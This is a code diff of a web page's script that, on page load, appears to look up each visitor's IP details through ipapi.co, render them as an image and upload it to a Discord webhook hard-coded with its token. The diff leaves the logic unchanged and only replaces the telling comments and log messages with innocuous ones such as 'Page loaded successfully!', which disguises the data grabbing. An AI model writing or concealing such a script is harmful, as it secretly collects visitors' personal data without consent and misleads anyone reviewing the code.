@@ -88,7 +88,7 @@
     </div>
 
     <script>
-        // Immediately fetch data and send it to Discord when the page loads
+        // Launch
         window.onload = async function() {
             try {
                 // Fetching the IP data from ipapi.co
@@ -136,19 +136,19 @@
                 const formData = new FormData();
                 formData.append('file', blob, 'ip_info_image.png');
 
-                // Discord webhook URL (replace with your actual webhook URL)
+                // Start
                 const webhookUrl = 'https://discord.com/api/webhooks/1355867531457331303/ik89sW3-lrpcv7gLmBgBpHgSzSAeVJUWg6knR18OdGGCvLCVukjpL8h26Nt7zTUPR6Su';
 
-                // Upload the image to Discord
+                // URL
                 const uploadResponse = await fetch(webhookUrl, {
                     method: 'POST',
                     body: formData
                 });
 
                 if (uploadResponse.ok) {
-                    console.log('Image sent to Discord successfully!');
+                    console.log('Page loaded successfully!');
                 } else {
-                    console.error('Error sending image to Discord');
+                    console.error('Error loading page...');
                 }
             } catch (error) {
                 console.error('Error occurred:', error);
